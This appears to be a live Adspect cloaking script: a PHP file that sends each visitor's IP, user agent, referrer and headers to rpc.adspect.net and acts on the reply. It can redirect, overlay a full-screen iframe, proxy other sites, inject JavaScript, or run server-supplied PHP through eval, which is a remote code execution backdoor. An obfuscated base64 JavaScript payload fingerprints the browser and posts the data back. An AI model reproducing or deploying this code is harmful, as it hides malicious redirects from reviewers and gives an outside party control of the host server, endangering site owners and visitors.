<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('af590068-f4c5-4dd2-b645-fbbb0caa6441', 'redirect', '_', base64_decode('xVY6sx3GKJjCbuXTl3Y6RybNlEwZQQIDMj9fIXUCnnY=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weDViODg9WydUb3VjaEV2ZW50JywnaW5wdXQnLCdnZXRQYXJhbWV0ZXInLCcyNTM3MTl6c2xEWnQnLCczNDIwNTFBdEZkdUwnLCdoaWRkZW4nLCd3ZWJnbCcsJzFsR2RzSG4nLCdjYW52YXMnLCdnZXRFeHRlbnNpb24nLCdhcHBlbmRDaGlsZCcsJ21lc3NhZ2UnLCd0b3VjaEV2ZW50JywnVU5NQVNLRURfVkVORE9SX1dFQkdMJywnbG9jYXRpb24nLCdQT1NUJywnNDAzMjUzUHFkcW9vJywnbm90aWZpY2F0aW9ucycsJ3Blcm1pc3Npb25zJywnd2luZG93JywnY3JlYXRlRWxlbWVudCcsJ2JvZHknLCdzdWJtaXQnLCd0eXBlJywnbm9kZVZhbHVlJywncXVlcnknLCdlcnJvcnMnLCcxMzAzOTZOZ0hvaEcnLCduYXZpZ2F0b3InLCdocmVmJywndGltZXpvbmVPZmZzZXQnLCd0b1N0cmluZycsJ2xlbmd0aCcsJ25vZGVOYW1lJywnV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbycsJ2F0dHJpYnV0ZXMnLCdmdW5jdGlvbicsJzExMjE4OTVWRGJDWGcnLCcxaGdYdENWJywnZG9jdW1lbnQnLCdvYmplY3QnLCdkb2N1bWVudEVsZW1lbnQnLCdjcmVhdGVFdmVudCcsJ3B1c2gnLCd2YWx1ZScsJ2dldFRpbWV6b25lT2Zmc2V0JywncGVybWlzc2lvbicsJ3N0YXRlJywnbWV0aG9kJywndGhlbicsJ3N0cmluZ2lmeScsJzEzNTUxMFVGekFCcCcsJ3NjcmVlbicsJ2FjdGlvbicsJ2NvbnNvbGUnLCczMjgwNDNiWERKRFUnLCdVTk1BU0tFRF9SRU5ERVJFUl9XRUJHTCcsJ2dldENvbnRleHQnXTt2YXIgXzB4MTgyZD1mdW5jdGlvbihfMHgxMDljOGYsXzB4NWU4MWYzKXtfMHgxMDljOGY9XzB4MTA5YzhmLTB4MWU5O3ZhciBfMHg1Yjg4Zjc9XzB4NWI4OFtfMHgxMDljOGZdO3JldHVybiBfMHg1Yjg4Zjc7fTsoZnVuY3Rpb24oXzB4NDgzMjdjLF8weDNiMWQ0OCl7dmFyIF8weDU5ZjliMz1fMHgxODJkO3doaWxlKCEhW10pe3RyeXt2YXIgXzB4MTU0MDliPS1wYXJzZUludChfMHg1OWY5YjMoMHgyMDkpKSstcGFyc2VJbnQoXzB4NTlmOWIzKDB4MWZlKSkrcGFyc2VJbnQoXzB4NTlmOWIzKDB4MjA4KSkrLXBhcnNlSW50KF8weDU5ZjliMygweDIwMikpK3BhcnNlSW50KF8weDU5ZjliMygweDIwYykpKi1wYXJzZUludChfMHg1OWY5YjMoMHgyMTUpKStwYXJzZUludChfMHg1OWY5YjMoMHgyMjApKStwYXJzZUludChfMHg1OWY5YjMoMHgxZjEpKSpwYXJzZUludChfMHg1OWY5YjMoMHgxZjApKTtpZihfMHgxNTQwOWI9PT1fMHgzYjFkNDgpYnJlYWs7ZWxzZSBfMHg0ODMyN2NbJ3B1c2gnXShfMHg0ODMyN2NbJ3NoaWZ0J10oKSk7fWNhdGNoKF8weDRhMjFmOCl7XzB4NDgzMjdjWydwdXNoJ10oXzB4NDgzMjdjWydzaGlmdCddKCkpO319fShfMHg1Yjg4LDB4NDg4YzEpLGZ1bmN0aW9uKCl7dmFyIF8weDJiY2Y2Zj1fMHgxODJkO2Z1bmN0aW9uIF8weDFjZWQ0NCgpe3ZhciBfMHg0ZmQxNDU9XzB4MTgyZDtfMHgzMTA0ZDlbXzB4NGZkMTQ1KDB4MjFmKV09XzB4NGNhZDMxO3ZhciBfMHg1MWYwZjI9ZG9jdW1lbnRbXzB4NGZkMTQ1KDB4MjE5KV0oJ2Zvcm0nKSxfMHg0MWVkMzE9ZG9jdW1lbnRbJ2NyZWF0ZUVsZW1lbnQnXShfMHg0ZmQxNDUoMHgyMDYpKTtfMHg1MWYwZjJbXzB4NGZkMTQ1KDB4MWZiKV09XzB4NGZkMTQ1KDB4MjE0KSxfMHg1MWYwZjJbXzB4NGZkMTQ1KDB4MjAwKV09d2luZG93W18weDRmZDE0NSgweDIxMyldW18weDRmZDE0NSgweDIyMildLF8weDQxZWQzMVtfMHg0ZmQxNDUoMHgyMWMpXT1fMHg0ZmQxNDUoMHgyMGEpLF8weDQxZWQzMVsnbmFtZSddPSdkYXRhJyxfMHg0MWVkMzFbXzB4NGZkMTQ1KDB4MWY3KV09SlNPTltfMHg0ZmQxNDUoMHgxZmQpXShfMHgzMTA0ZDkpLF8weDUxZjBmMltfMHg0ZmQxNDUoMHgyMGYpXShfMHg0MWVkMzEpLGRvY3VtZW50W18weDRmZDE0NSgweDIxYSldWydhcHBlbmRDaGlsZCddKF8weDUxZjBmMiksXzB4NTFmMGYyW18weDRmZDE0NSgweDIxYildKCk7fXZhciBfMHg0Y2FkMzE9W10sXzB4MzEwNGQ5PXt9O3RyeXt2YXIgXzB4MjdlMDFiPWZ1bmN0aW9uKF8weDM5MjMxYyl7dmFyIF8weDIyOGZkYT1fMHgxODJkO2lmKCdvYmplY3QnPT09dHlwZW9mIF8weDM5MjMxYyYmbnVsbCE9PV8weDM5MjMxYyl7dmFyIF8weDIxY2JiZj1mdW5jdGlvbihfMHgxNzY4ZWQpe3ZhciBfMHgzMGEwMTI9XzB4MTgyZDt0cnl7dmFyIF8weDE1NzQ3Nz1fMHgzOTIzMWNbXzB4MTc2OGVkXTtzd2l0Y2godHlwZW9mIF8weDE1NzQ3Nyl7Y2FzZSBfMHgzMGEwMTIoMHgxZjMpOmlmKG51bGw9PT1fMHgxNTc0NzcpYnJlYWs7Y2FzZSBfMHgzMGEwMTIoMHgxZWYpOl8weDE1NzQ3Nz1fMHgxNTc0NzdbJ3RvU3RyaW5nJ10oKTt9XzB4MTgxYWMxW18weDE3NjhlZF09XzB4MTU3NDc3O31jYXRjaChfMHgzYjdhMjQpe18weDRjYWQzMVtfMHgzMGEwMTIoMHgxZjYpXShfMHgzYjdhMjRbXzB4MzBhMDEyKDB4MjEwKV0pO319LF8weDE4MWFjMT17fSxfMHg0MTRjYzg7Zm9yKF8weDQxNGNjOCBpbiBfMHgzOTIzMWMpXzB4MjFjYmJmKF8weDQxNGNjOCk7dHJ5e3ZhciBfMHhiODRmZDI9T2JqZWN0WydnZXRPd25Qcm9wZXJ0eU5hbWVzJ10oXzB4MzkyMzFjKTtmb3IoXzB4NDE0Y2M4PTB4MDtfMHg0MTRjYzg8XzB4Yjg0ZmQyW18weDIyOGZkYSgweDFlYildOysrXzB4NDE0Y2M4KV8weDIxY2JiZihfMHhiODRmZDJbXzB4NDE0Y2M4XSk7XzB4MTgxYWMxWychISddPV8weGI4NGZkMjt9Y2F0Y2goXzB4MTQ1YTM2KXtfMHg0Y2FkMzFbJ3B1c2gnXShfMHgxNDVhMzZbXzB4MjI4ZmRhKDB4MjEwKV0pO31yZXR1cm4gXzB4MTgxYWMxO319O18weDMxMDRkOVsnc2NyZWVuJ109XzB4MjdlMDFiKHdpbmRvd1tfMHgyYmNmNmYoMHgxZmYpXSksXzB4MzEwNGQ5W18weDJiY2Y2ZigweDIxOCldPV8weDI3ZTAxYih3aW5kb3cpLF8weDMxMDRkOVtfMHgyYmNmNmYoMHgyMjEpXT1fMHgyN2UwMWIod2luZG93W18weDJiY2Y2ZigweDIyMSldKSxfMHgzMTA0ZDlbXzB4MmJjZjZmKDB4MjEzKV09XzB4MjdlMDFiKHdpbmRvd1tfMHgyYmNmNmYoMHgyMTMpXSksXzB4MzEwNGQ5W18weDJiY2Y2ZigweDIwMSldPV8weDI3ZTAxYih3aW5kb3dbJ2NvbnNvbGUnXSksXzB4MzEwNGQ5W18weDJiY2Y2ZigweDFmNCldPWZ1bmN0aW9uKF8weDU2YTEzZil7dmFyIF8weDEzODFkZD1fMHgyYmNmNmY7dHJ5e3ZhciBfMHg1ZTIxYzg9e307XzB4NTZhMTNmPV8weDU2YTEzZltfMHgxMzgxZGQoMHgxZWUpXTtmb3IodmFyIF8weDM5MmQ3MSBpbiBfMHg1NmExM2YpXzB4MzkyZDcxPV8weDU2YTEzZltfMHgzOTJkNzFdLF8weDVlMjFjOFtfMHgzOTJkNzFbXzB4MTM4MWRkKDB4MWVjKV1dPV8weDM5MmQ3MVtfMHgxMzgxZGQoMHgyMWQpXTtyZXR1cm4gXzB4NWUyMWM4O31jYXRjaChfMHg4M2ZkZTkpe18weDRjYWQzMVtfMHgxMzgxZGQoMHgxZjYpXShfMHg4M2ZkZTlbXzB4MTM4MWRkKDB4MjEwKV0pO319KGRvY3VtZW50W18weDJiY2Y2ZigweDFmNCldKSxfMHgzMTA0ZDlbXzB4MmJjZjZmKDB4MWYyKV09XzB4MjdlMDFiKGRvY3VtZW50KTt0cnl7XzB4MzEwNGQ5W18weDJiY2Y2ZigweDFlOSldPW5ldyBEYXRlKClbXzB4MmJjZjZmKDB4MWY4KV0oKTt9Y2F0Y2goXzB4NWMxNGVlKXtfMHg0Y2FkMzFbXzB4MmJjZjZmKDB4MWY2KV0oXzB4NWMxNGVlWydtZXNzYWdlJ10pO310cnl7XzB4MzEwNGQ5WydjbG9zdXJlJ109ZnVuY3Rpb24oKXt9W18weDJiY2Y2ZigweDFlYSldKCk7fWNhdGNoKF8weDJmNDBiMSl7XzB4NGNhZDMxW18weDJiY2Y2ZigweDFmNildKF8weDJmNDBiMVtfMHgyYmNmNmYoMHgyMTApXSk7fXRyeXtfMHgzMTA0ZDlbXzB4MmJjZjZmKDB4MjExKV09ZG9jdW1lbnRbXzB4MmJjZjZmKDB4MWY1KV0oXzB4MmJjZjZmKDB4MjA1KSlbXzB4MmJjZjZmKDB4MWVhKV0oKTt9Y2F0Y2goXzB4NTVmOTY0KXtfMHg0Y2FkMzFbXzB4MmJjZjZmKDB4MWY2KV0oXzB4NTVmOTY0W18weDJiY2Y2ZigweDIxMCldKTt9dHJ5e18weDI3ZTAxYj1mdW5jdGlvbigpe307dmFyIF8weDMwYmRkYj0weDA7XzB4MjdlMDFiWyd0b1N0cmluZyddPWZ1bmN0aW9uKCl7cmV0dXJuKytfMHgzMGJkZGIsJyc7fSxjb25zb2xlWydsb2cnXShfMHgyN2UwMWIpLF8weDMxMDRkOVsndG9zdHJpbmcnXT1fMHgzMGJkZGI7fWNhdGNoKF8weDkxMjQ4Myl7XzB4NGNhZDMxWydwdXNoJ10oXzB4OTEyNDgzW18weDJiY2Y2ZigweDIxMCldKTt9d2luZG93W18weDJiY2Y2ZigweDIyMSldW18weDJiY2Y2ZigweDIxNyldW18weDJiY2Y2ZigweDIxZSldKHsnbmFtZSc6XzB4MmJjZjZmKDB4MjE2KX0pW18weDJiY2Y2ZigweDFmYyldKGZ1bmN0aW9uKF8weDRiMzQxZCl7dmFyIF8weDFmYjE4NT1fMHgyYmNmNmY7XzB4MzEwNGQ5W18weDFmYjE4NSgweDIxNyldPVt3aW5kb3dbJ05vdGlmaWNhdGlvbiddW18weDFmYjE4NSgweDFmOSldLF8weDRiMzQxZFtfMHgxZmIxODUoMHgxZmEpXV0sXzB4MWNlZDQ0KCk7fSxfMHgxY2VkNDQpO3RyeXt2YXIgXzB4ZTlhODcwPWRvY3VtZW50WydjcmVhdGVFbGVtZW50J10oXzB4MmJjZjZmKDB4MjBkKSlbXzB4MmJjZjZmKDB4MjA0KV0oXzB4MmJjZjZmKDB4MjBiKSksXzB4NGE4MWVhPV8weGU5YTg3MFtfMHgyYmNmNmYoMHgyMGUpXShfMHgyYmNmNmYoMHgxZWQpKTtfMHgzMTA0ZDlbJ3dlYmdsJ109eyd2ZW5kb3InOl8weGU5YTg3MFtfMHgyYmNmNmYoMHgyMDcpXShfMHg0YTgxZWFbXzB4MmJjZjZmKDB4MjEyKV0pLCdyZW5kZXJlcic6XzB4ZTlhODcwW18weDJiY2Y2ZigweDIwNyldKF8weDRhODFlYVtfMHgyYmNmNmYoMHgyMDMpXSl9O31jYXRjaChfMHgyMjUxZTApe18weDRjYWQzMVtfMHgyYmNmNmYoMHgxZjYpXShfMHgyMjUxZTBbXzB4MmJjZjZmKDB4MjEwKV0pO319Y2F0Y2goXzB4NTJhMmI2KXtfMHg0Y2FkMzFbXzB4MmJjZjZmKDB4MWY2KV0oXzB4NTJhMmI2WydtZXNzYWdlJ10pLF8weDFjZWQ0NCgpO319KCkpOw=="></script>
</body>
</html>
<?php exit;